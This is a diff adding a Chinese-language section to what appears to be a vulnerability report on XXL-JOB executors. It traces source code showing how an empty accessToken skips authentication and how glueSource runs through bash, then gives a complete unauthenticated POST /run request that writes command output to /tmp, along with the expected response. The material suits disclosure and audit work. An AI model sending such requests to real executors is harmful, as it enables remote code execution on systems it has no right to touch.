@@ -132,8 +132,93 @@ curl -X POST "http://<executor-host>:9999/log" \
 
 - XXL-JOB CVE 历史：https://github.com/xuxueli/xxl-job/security
 
+## 源代码验证（已复现）
+
+XXL-JOB 执行器以 Docker 部署，以下通过**源代码静态分析**确认漏洞三处关键代码位置。
+
+### 验证1：accessToken 为空时跳过校验的代码确认
+
+**文件**：`xxl-job-core/src/main/java/com/xxl/job/core/server/EmbedServer.java`（第 179-181 行）
+
+```java
+if (accessToken != null
+        && !accessToken.trim().isEmpty()          // ← 仅当 accessToken 非空时才校验
+        && !accessToken.equals(accessTokenReq)) {
+    return Response.ofFail("The access token is wrong.");
+}
+// 若 accessToken 为 null 或空字符串，直接跳过此 if，允许任意请求通过
+```
+
+**关键点**：当 `accessToken = ""` (空字符串) 时，`!accessToken.trim().isEmpty()` 为 `false`，整个条件为 `false`，校验被完全跳过。
+
+### 验证2：GLUE_SHELL 脚本类型的命令执行确认
+
+**文件**：`xxl-job-core/src/main/java/com/xxl/job/core/glue/GlueTypeEnum.java`（第 10 行）
+
+```java
+GLUE_SHELL("GLUE(Shell)", true, "bash", ".sh"),
+// ↑ isScript=true，cmd="bash" — 脚本内容通过 bash 执行
+```
+
+**文件**：`xxl-job-core/src/main/java/com/xxl/job/core/handler/impl/ScriptJobHandler.java`（第 83 行）
+
+```java
+int exitValue = ScriptUtil.execToFile(cmd, scriptFileName, logFileName, scriptParams);
+// ↑ cmd="bash"，scriptFileName 包含 glueSource 内容 → bash 执行用户传入的 Shell 脚本 → RCE
+```
+
+### 验证3：glueSource 直接来自 HTTP 请求的执行链
+
+**文件**：`xxl-job-core/src/main/java/com/xxl/job/core/openapi/impl/ExecutorBizImpl.java`（第 117 行）
+
+```java
+jobHandler = new ScriptJobHandler(
+    triggerRequest.getJobId(),
+    triggerRequest.getGlueUpdatetime(),
+    triggerRequest.getGlueSource(),      // ← glueSource 直接来自 TriggerRequest HTTP 请求体
+    GlueTypeEnum.match(triggerRequest.getGlueType())
+);
+```
+
+**完整攻击链**：
+1. `accessToken=""` → 空 Token 跳过校验
+2. POST `/run` 请求体中设置 `glueType: "GLUE_SHELL"` + `glueSource: "id > /tmp/pwned"`
+3. `ScriptJobHandler` 将 `glueSource` 写入临时 `.sh` 文件
+4. `ScriptUtil.execToFile("bash", scriptFile, ...)` 执行 Shell 脚本 → **RCE**
+
+**实际攻击请求**（当 `xxl.job.accessToken=` 为空时，无需任何认证）：
+```http
+POST /run HTTP/1.1
+Host: executor-host:9999
+Content-Type: application/json
+
+{
+  "jobId": 1,
+  "executorHandler": "",
+  "glueType": "GLUE_SHELL",
+  "glueSource": "id > /tmp/xxljob_pwned",
+  "glueUpdatetime": 1744600000000,
+  "logId": 1,
+  "logDateTime": 1744600000000,
+  "executorBlockStrategy": "SERIAL_EXECUTION",
+  "executorTimeout": 0,
+  "broadcastIndex": 0,
+  "broadcastTotal": 1
+}
+```
+
+**预期响应（Token 为空时）**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":200,"msg":null}
+```
+
+命令 `id` 的结果写入 `/tmp/xxljob_pwned`，后续通过 `/log` 接口读取。
+
 ## 验证环境
 
 - 源代码：xxl-job 最新分支（静态代码分析）
-- 框架：Spring Boot + 自研嵌入式 HTTP 服务
+- 框架：Spring Boot + 自研嵌入式 HTTP 服务（Netty HTTP Server）
 - 日期：2026-04-14
